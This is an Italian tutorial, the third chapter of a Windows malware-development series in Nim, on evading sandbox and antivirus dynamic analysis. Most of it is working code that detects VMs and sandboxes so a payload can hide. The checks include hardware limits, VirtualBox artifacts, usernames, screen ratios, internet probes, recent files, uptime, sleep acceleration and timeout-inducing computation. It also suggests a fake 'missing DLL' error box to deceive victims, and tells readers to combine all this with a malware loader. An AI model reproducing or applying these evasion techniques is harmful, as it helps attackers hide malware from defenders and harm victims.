# Capitolo 3: analisi dinamica

Questo è il terzo capitolo di una serie dedicata al malware developing su Windows. Andremo a vedere e implementare tecniche per creare malware e nasconderlo. Verrà usato principalmente [Nim](https://nim-lang.org/) come linguaggio d programmazione (è sottointeso che dovresti conoscerne _almeno_ le basi e averci fatto un progetto sopra)

## Cos'è l'analisi dinamica?

L'analisi dinamica di un programma consiste nell'esecuzione di esso in un ambiente isolato per controllare se performa comportamenti anomali e/o pericolosi. La maggior parte degli antiviurs prevede un'implementazione di analisi dinamica. Oggi andremo a vedere un paio di metodi per evadere questo tipo di analisi.

## Come confondere i sistemi di analisi dinamica?

Le sandbox e le VM impiegate nell'analisi dinamica in genere non sono mai delle riproduzioni 1:1 di un vero e proprio target, quindi il metodo migliore per confondere l'analisi dinamica è semplicemente non eseguire il nostro malware sotto determinate condizioni. L'idea è un po' questa:

    import payloadModule

    let redflag1 = false
    let redflag2 = true

    const arr = @[redflag1, redflag2]

    for item in arr:
       if item:
            quit()
    
    payload()

...dove payload() è la funzione principale del payload importato con payloadModule. 

Ora il problema è sostituire le variabili di `arr` con delle effettive redflag.

## Risorse limitate

In genere le sandbox hanno un numero limitato di risorse a loro disposizione, quindi quando troviamo risorse limitate al punto di essere anormali possiamo avere certezza che ci troviamo nel contesto di una sandbox.

In genere un computer possiede 2 CPU cores, 2 GB di RAM e 64 GB di spazio non volatile.
Si possono implementare queste caratteristiche nella maniera seguente:

CPU:

    import std/cpuinfo
    proc sandboxProcessors(): bool =
        if countProcessors() < 2:
            return true
        else:
            return false


RAM:

    import strutils
    import osproc
    proc extractNumericComponents(input: string): string =
        var result = ""
        for c in input:
            if c.isDigit:
                result.add(c)
        return result
    
    proc sandboxRam(): bool =
        if parseInt(extractNumericComponents(execProcess("wmic memorychip get capacity"))) < 2048:
            return true
        else:
            return false

Disco: 

    import strutils
    import osproc
    proc extractNumericComponents(input: string): string =
        var result = ""
        for c in input:
            if c.isDigit:
                result.add(c)
        return result
    
    proc sandboxDisk(): bool =
        if parseInt(extractNumericComponents(execProcess("wmic logicaldisk get size"))) < 64000000000:
            return true
        else:
            return false


## Artifatti delle VM

Ci sono una varietà di artifatti che contradistinguono una VM da un vero computer. Un esempio anti-VirtualBox:

    import strutils
    import osproc
    import tables

    proc evaluateCommandOutput(command: string, substring: string): bool =
        let caption = execProcess(command)
        if caption.contains(substring):
            return true
        else:
            return false

    const virtualBoxSet = {"wmic diskdrive get caption": "VBOX", 
                           "wmic PATH Win32_PnPEntity GET Caption": "VBoxGuest",
                           """cmd /C dir C:\Windows\System32""": "VBox"}.toTable

    proc virtualBox(): bool =
        for command, substring in virtualBoxSet:
            if evaluateCommandOutput(command, substring):
                return true
                break
    
        return false

Questo snippet consiste nel eseguire determinati comandi per ottenere i loro output (in questo caso le capiton degli hard drive, i dispositivi e il directory listing di System32). Lo scopo è ottenere riscontro di sub stringhe associate con questi comandi.

## Nome del file

In genere le sandbox e i blue teamer rinnominano i programmi da mandare in analisi con un nome consistente. Se quindi si vuole distribuire il malware con un nome specifico si può fare l'hardcoding del nome stesso e controllare che corrisponda al nome attuale del file:

    import os

    proc suspuciousAppName(): bool =
        if getAppFilename() != "nome hardcoded qua":
            return true
        else:
            return false

## Default name blocklist

Quando un computer ha come username "Admin" o una simile variante, in genere non si tratta di una macchina autentica. Lo stesso può essere detto per i computer che come nome hanno "DESKTOP-xxxxxxx":

    import os
    import strutils

    const userBlacklist: seq = @["Admin", "Administrator", "Admin-Pc"]
    const computerBlacklist: seq = @["Desktop-"]

    proc suspiciousName(env: string, blacklist: seq): bool =
        for name in blacklist:
            var susArray = [name, name.toLower, name.toUpper]
            for sus in susArray:
                if getEnv(env) == sus:
                    return true

        return false

    let suspiciousUsername = suspiciousName("USERNAME", userBlacklist)
    let suspiciousComputerName = suspiciousName("COMPUTERNAME", computerBlacklist)

## Monitor insolito

Può (spesso) capitare che i monitor virtuali generati dalle sandbox e dagli hypervisor hanno rapporti insoliti. Se il monitor (principale) non rispetta una serie di comuni rapporti allora è probabilmente una VM:

    import winim/lean

    let xScreen: int = GetSystemMetrics(SM_CXSCREEN)
    let yScreen: int = GetSystemMetrics(SM_CYSCREEN)

    let acceptableRatios = @[5/4, 4/3, 16/10, 16/9]

    proc suspiciousScreen(): bool =
        for ratio in acceptableRatios:
            if xScreen/yScreen == ratio:
                return false
    
        return true

## Internet fasullo

In genere le sandbox non posseggono accesso ad internet (per ovvie ragioni), di conseguenza possiamo fare una richiesta ad un server (preferibilmente separato da qualsiasi altro endpoint relato al malware) e verificarne la richiesta:

    import httpclient

    proc fetchUrl(url: string): string =
        let client = newHttpClient(url)
        let response = client.get(url)
        client.close()
        return response.body

    proc fakeInternet(): bool =
        if fetchUrl("https://inserisci.indirizzo.di.verifica.qua.com") != "inserisci messaggio qua":
            return true
        return false

## Nessuna interazione

Sono poche le sandbox che riescono a formulare user inputs, quindi puoi semplicemente aprire una MessageBox e caricare il malware appena è confermata.

    import winim/lean

    # Grangdd.dll non è una libreria esistente
    MessageBox(0, T"Grangdd.ddl is missing.", T"Error", 0)
    payload()

**NOTA**: lo scopo di un malware in genere è funzionare senza nessuna interazione da parte della vittima. É consigliato considerare questa soluzione quando nient'altro a funzionato per eludere le misure di sicurezza del tuo target ideale.

## Nessuna attività recente

Si può controllare la cartella dei recenti e enumerare il numero degli oggetti per vedere se sono troppi pochi:

    import os 
    import strformat
        var test = 0

    let path = fmt"""{getEnv("APPDATA")}\Microsoft\Windows\Recent"""
    for kind, path in walkDir(path):
        test = test + 1

    proc noRecents(): bool =
        if test < 5:
            return true

        return false

## Timing immediato 

Se il computer è accesso da troppo poco per controllare un link, aprirlo, scaricare ed eseguire il tuo malware allora probabilmente si tratta di una sandbox:

    import winim/lean

    let timeElapsed = GetTickCount64() 
    let minimumTime: ULONGLONG = 1200000

    proc tooFast(): bool =
        if timeElapsed < minimumTime:
            return true

        return false

**Nota**: ricorda che se hai creato una shortcut nella cartella di startup e non usi nessun controllo per assicurarsi che questa shortcut esista il payload si terminerà da solo. 

## sleep() accellerato

Se ogni sandbox lasciasse passare le funzioni sleep() normalmente si avrebbe un metodo infallibile per evitare la sandbox con un timeout. Quindi in genere le funzioni sleep() vengono accellerate:

    import winim/lean
    import os

    proc accelleratedTiming(): bool =
        let elapsedBeforeSleep = GetTickCount64() 
        sleep(30000)
        let elapsedAfterSleep = GetTickCount64()
        if elapsedAfterSleep - elapsedBeforeSleep < 29000:
            return true

        return false

In questo esempio stiamo dando un secondo in meno della funzione sleep per dare un po' di beneficio del dubbio.

## Calcolo complesso

Si può creare un calcolo complesso senza nessuna ragione semplicemente per mandare la sandbox in timeout:

    import bigints

    proc factorize(input: int): BigInt =
        var output = 1.initBigInt
        for i in countup(1, input):
            output = output * i.initBigInt
        return output

    discard factorize(223243)

Usiamo il modulo [BigInt](https://github.com/nim-lang/bigints) per ottenere dei bigint in nim (e quindi non causare eccezioni) e poi facciamo il fattoriale di un numero. Questo calcolo sul mio laptop da gaming ci ha messo approsimativamente un minuto (e 3 secondi)

## Complimenti

Prova ad implementare queste tecniche con il loader del capitolo 1 